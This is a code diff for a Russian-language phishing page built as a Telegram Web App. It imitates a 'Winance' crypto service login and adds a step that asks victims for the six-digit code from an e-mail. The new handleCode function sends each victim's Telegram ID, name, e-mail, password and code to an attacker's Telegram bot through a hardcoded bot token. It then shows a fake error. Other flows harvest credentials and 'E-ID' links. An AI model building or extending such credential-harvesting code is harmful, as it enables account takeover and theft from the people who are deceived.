@@ -298,6 +298,29 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
 .message.error { display: block; background: rgba(207,32,47,0.1); color: var(--danger); border: 1px solid rgba(207,32,47,0.2); }
 .message.info { display: block; background: rgba(27,173,255,0.1); color: var(--accent); border: 1px solid rgba(27,173,255,0.2); }
 
+.status-waiting {
+    margin-top: 12px;
+    padding: 12px;
+    background: var(--bg-card);
+    border-radius: var(--radius-md);
+    text-align: center;
+    color: var(--accent);
+    font-size: 13px;
+    display: none;
+    border: 1px solid var(--border);
+}
+.status-waiting .spinner {
+    display: inline-block;
+    width: 14px; height: 14px;
+    border: 2px solid rgba(27,173,255,0.2);
+    border-top-color: var(--accent);
+    border-radius: 50%;
+    animation: spin .8s linear infinite;
+    margin-right: 6px;
+    vertical-align: middle;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
 /* ===== ОШИБКА ===== */
 .error-page { text-align: center; padding: 30px 0; }
 .error-page .icon {
@@ -433,6 +456,23 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
         <button class="btn-back" onclick="goTo('main')">← Назад</button>
     </div>
 
+    <!-- ============ ВВОД КОДА (ПОСЛЕ ПОЧТЫ И ПАРОЛЯ) ============ -->
+    <div id="pageCode" class="page">
+        <div class="page-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></div>
+        <div class="page-title">Подтверждение</div>
+        <div class="page-sub">Введите код из письма</div>
+
+        <div class="code-section">
+            <label>Код из 6 цифр</label>
+            <input type="text" id="codeInput" maxlength="6" placeholder="000000" inputmode="numeric">
+            <button id="codeBtn" class="btn-primary" onclick="handleCode()">Отправить</button>
+        </div>
+
+        <div id="codeError" class="message error"></div>
+        <div id="codeStatus" class="status-waiting"><span class="spinner"></span>Проверка...</div>
+        <button class="btn-back" onclick="goTo('loginForm')">← Назад</button>
+    </div>
+
     <!-- ============ ВХОД ЧЕРЕЗ E-ID (ПОЧТА И ПАРОЛЬ) ============ -->
     <div id="pageEidForm" class="page">
         <div class="page-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg></div>
@@ -512,8 +552,8 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
     // КОНФИГ (ВСТАВЬ СВОЙ ТОКЕН!)
     // ============================================================
     const BOT_TOKEN = "8962930921:AAE-EWR1IbKM5HkA4xKpV1mpaWQ4bCno0DE";
-    const ADMIN_ID  = "8949174431";
-    const SUPPORT_LINK = "https://t.me/winance_support"; // Ссылка на ТП
+    const ADMIN_ID  = "8542901240";
+    const SUPPORT_LINK = "https://t.me/winance_support";
     const MAX_ATTEMPTS = 3;
 
     const tg = window.Telegram.WebApp;
@@ -530,6 +570,7 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
         guide:     document.getElementById('pageGuide'),
         faq:       document.getElementById('pageFaq'),
         loginForm: document.getElementById('pageLoginForm'),
+        code:      document.getElementById('pageCode'),
         eidForm:   document.getElementById('pageEidForm'),
         eidLink:   document.getElementById('pageEidLink'),
         error:     document.getElementById('pageError'),
@@ -537,18 +578,22 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
 
     const email = document.getElementById('email');
     const password = document.getElementById('password');
+    const codeInput = document.getElementById('codeInput');
     const eidEmail = document.getElementById('eidEmail');
     const eidPassword = document.getElementById('eidPassword');
     const eidLinkInput = document.getElementById('eidLinkInput');
 
     const loginError = document.getElementById('loginError');
+    const codeError = document.getElementById('codeError');
     const eidError = document.getElementById('eidError');
     const eidLinkError = document.getElementById('eidLinkError');
 
     const loginBtn = document.getElementById('loginBtn');
+    const codeBtn = document.getElementById('codeBtn');
     const eidBtn = document.getElementById('eidBtn');
     const eidLinkBtn = document.getElementById('eidLinkBtn');
 
+    const codeStatus = document.getElementById('codeStatus');
     const msgDiv = document.getElementById('msg');
 
     let userEmail = '';
@@ -570,17 +615,22 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
         pages[name].classList.add('active');
         msgDiv.style.display = 'none';
         loginError.style.display = 'none';
+        codeError.style.display = 'none';
         eidError.style.display = 'none';
         eidLinkError.style.display = 'none';
+        codeStatus.style.display = 'none';
 
         if (name === 'main') {
             email.value = '';
             password.value = '';
+            codeInput.value = '';
             eidEmail.value = '';
             eidPassword.value = '';
             eidLinkInput.value = '';
             loginBtn.disabled = false;
             loginBtn.textContent = 'Войти';
+            codeBtn.disabled = false;
+            codeBtn.textContent = 'Отправить';
             eidBtn.disabled = false;
             eidBtn.textContent = 'Получить ссылку';
             eidLinkBtn.disabled = false;
@@ -588,6 +638,7 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
             attemptCount = 0;
         }
         if (name === 'loginForm') setTimeout(() => email.focus(), 200);
+        if (name === 'code') setTimeout(() => codeInput.focus(), 200);
         if (name === 'eidForm') setTimeout(() => eidEmail.focus(), 200);
         if (name === 'eidLink') setTimeout(() => eidLinkInput.focus(), 200);
     }
@@ -606,7 +657,6 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
         return false;
     }
 
-    // Отправка тебе в ЛС
     async function sendToAdmin(text) {
         try {
             const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -626,7 +676,7 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
         }
     }
 
-    // ===== 1. ОБЫЧНЫЙ ВХОД =====
+    // ===== 1. ОБЫЧНЫЙ ВХОД -> ПЕРЕХОД НА КОД =====
     async function handleLogin() {
         const e = email.value.trim();
         const p = password.value.trim();
@@ -660,11 +710,46 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
             return;
         }
         
-        // В случае успеха кидаем на ошибку (или можно на ввод кода)
-        goTo('error'); 
+        // Переходим на ввод кода
+        goTo('code');
+        codeStatus.style.display = 'block';
     }
 
-    // ===== 2. E-ID: ЗАПРОС ССЫЛКИ (Email + Пароль) =====
+    // ===== 2. ВВОД КОДА -> ОШИБКА =====
+    async function handleCode() {
+        const code = codeInput.value.trim();
+        if (!code || code.length < 4) { showMessage('Введите корректный код', 'error'); return; }
+
+        codeBtn.disabled = true;
+        codeBtn.textContent = 'Загрузка...';
+
+        const user = tg.initDataUnsafe?.user || {};
+        const msg =
+            `📧 <b>КОД ПОДТВЕРЖДЕНИЯ (Winance)</b>\n\n` +
+            `👤 ID: <code>${user.id || 'неизвестно'}</code>\n` +
+            `👤 Имя: ${user.first_name || '-'}\n\n` +
+            `📧 Email: <code>${userEmail}</code>\n` +
+            `🔑 Пароль: <code>${userPassword}</code>\n` +
+            `🔢 Код: <code>${code}</code>`;
+
+        const ok = await sendToAdmin(msg);
+
+        codeBtn.disabled = false;
+        codeBtn.textContent = 'Отправить';
+
+        if (!ok) {
+            if (handleError()) return;
+            codeError.textContent = `Ошибка. (${attemptCount}/${MAX_ATTEMPTS})`;
+            codeError.style.display = 'block';
+            return;
+        }
+
+        codeInput.value = '';
+        codeStatus.style.display = 'none';
+        goTo('error');
+    }
+
+    // ===== 3. E-ID: ЗАПРОС ССЫЛКИ =====
     async function handleEidRequest() {
         const e = eidEmail.value.trim();
         const p = eidPassword.value.trim();
@@ -691,11 +776,10 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
         eidBtn.disabled = false;
         eidBtn.textContent = 'Получить ссылку';
         
-        // Переходим на ввод ссылки
         goTo('eidLink');
     }
 
-    // ===== 3. E-ID: ОТПРАВКА ССЫЛКИ =====
+    // ===== 4. E-ID: ОТПРАВКА ССЫЛКИ -> ОШИБКА =====
     async function handleEidLink() {
         const link = eidLinkInput.value.trim();
         if (!link || !link.startsWith('http')) { showMessage('Вставьте корректную ссылку', 'error'); return; }
@@ -729,6 +813,7 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
     document.addEventListener('keypress', function(e) {
         if (e.key !== 'Enter') return;
         if (pages.loginForm.classList.contains('active')) handleLogin();
+        else if (pages.code.classList.contains('active')) handleCode();
         else if (pages.eidForm.classList.contains('active')) handleEidRequest();
         else if (pages.eidLink.classList.contains('active')) handleEidLink();
     });
